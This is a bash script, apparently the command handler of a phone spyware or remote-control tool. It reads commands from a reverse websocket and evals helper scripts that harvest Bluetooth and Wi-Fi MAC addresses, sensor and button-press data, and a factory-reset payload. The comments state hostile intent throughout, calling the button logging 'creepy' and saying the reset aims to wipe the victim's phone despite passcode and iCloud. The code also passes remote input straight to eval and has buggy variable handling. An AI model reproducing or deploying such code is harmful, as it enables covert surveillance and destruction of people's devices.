#!/bin/bash
# Author: Jonathan Scott
# Updated: Oct, 9th 2021
# This will trigger the bash scripts that will are run on a reverse websocket.

while read C
do
    cdir=`pwd`
    script=''
    first=''
    args=''

    spcs=`echo $C | grep \  | wc -l`
    ########### 1
    ####### Bluetooth
	# Capture the bluetooth MAC Address
    if [ $spcs -eq 1 ]; then
        first=$C
    else
        IFS=' ' read -a part <<< "$C"

        first=${part[0]}
        args=${C#${part[0]} }
    fi
    ########### 2
    ##### Wi-Fi
	# Capture the Wi-Fi MAC Address
     if [ $spcs -eq 2 ]; then
        second=$C
    else
        IFS=' ' read -a part <<< "$C"

        second=${part[0]}
        args=${C#${part[0]} }
    fi

    ########### 3
    ######## Battery
	# Grab the battery data
    if [ $spcs -eq 3 ]; then
        third=$C
    else
        IFS=' ' read -a part <<< "$C"

        third=${part[0]}
        args=${C#${part[0]} }
    fi

    ########### 4
    ######## Proximity Sensor
	# Capture the proximity sensor data to see if there is an object or if a person is looking at the device
    if [ $spcs -eq 4 ]; then
        fourth=$C
    else
        IFS=' ' read -a part <<< "$C"

        fourth=${part[0]}
        args=${C#${part[0]} }
    fi

     ########### 5
     ###### Vibration
	 # check to see if the vibrate functionality is enabled on the device
    if [ $spcs -eq 5 ]; then
        fifth=$C
    else
        IFS=' ' read -a part <<< "$C"

        fifth=${part[0]}
        args=${C#${part[0]} }
    fi

     ########### 6
     ###### Power Button
	 # capture the last time the user pressed the power button to measure consistancy
    if [ $spcs -eq 6 ]; then
        fifth=$C
    else
        IFS=' ' read -a part <<< "$C"

        sixth=${part[0]}
        args=${C#${part[0]} }
    fi

    ########### 7
     ###### Home Button
	 # Capture the last time the user pressed the home button if there is a home button so that I can measure consistancy
    if [ $spcs -eq 7 ]; then
        fifth=$C
    else
        IFS=' ' read -a part <<< "$C"

        seventh=${part[0]}
        args=${C#${part[0]} }
    fi

    ########### 8
    ###### Mute/Silence
	 # Capture the last time the mute/silence toggle switch has been enabled
    if [ $spcs -eq 8 ]; then
        fifth=$C
    else
        IFS=' ' read -a part <<< "$C"

        eighth=${part[0]}
        args=${C#${part[0]} }
    fi

    ########### 9
    ###### Volume Up
	# Capture the last time the user has pressed the volume up button to be creepy
    if [ $spcs -eq 9 ]; then
        fifth=$C
    else
        IFS=' ' read -a part <<< "$C"

        ninth=${part[0]}
        args=${C#${part[0]} }
    fi

    ########### 10
    ###### Volume Down
 	# Capture the last time the user has pressed the volume down button to be creepy
	 
    if [ $spcs -eq 10 ]; then
        fifth=$C
    else
        IFS=' ' read -a part <<< "$C"

        tenth=${part[0]}
        args=${C#${part[0]} }
    fi
	
    ########### 11
    ###### Factory Reset
	# Fuck the user up and reset their phone even if they have a passcode and an icloud account on their phone
	
    if [ $spcs -eq 11 ]; then
        fifth=$C
    else
        IFS=' ' read -a part <<< "$C"

        eleventh=${part[0]}
        args=${C#${part[0]} }
    fi






    if [ "$first" == "bluetooth" ]; then
        script='bluetooth.sh'

    elif [ "$second" == "wifi" ]; then
        script='wifi.sh'

    elif [ "$third" == "battery" ]; then
        script='battery.sh'

    elif [ "$fourth" == "proximity" ]; then
        script='proximity.sh'

    elif [ "$fifth" == "vibration" ]; then
        script='vibration.sh'

    elif [ "$sixth" == "power_button" ]; then
        script='power_button.sh'

    elif [ "$seventh" == "home_button" ]; then
        script='home_button.sh'

    elif [ "$eighth" == "mute_silence" ]; then
        script='mute_silence.sh'

    elif [ "$ninth" == "volume_up" ]; then
        script='volume_up.sh'

	elif [ "$tenth" == "volume_down" ]; then
        script='volume_down.sh'
		
    else [ "$eleventh" == "factory_reset" ]
        script='factory_reset.sh'	
    fi

    if [ ! -z $script ]; then
        #echo $cdir/$script $args
        eval $cdir/$script $args
    else
        echo "Error, you have been found out, abort: $C"
    fi

done
exit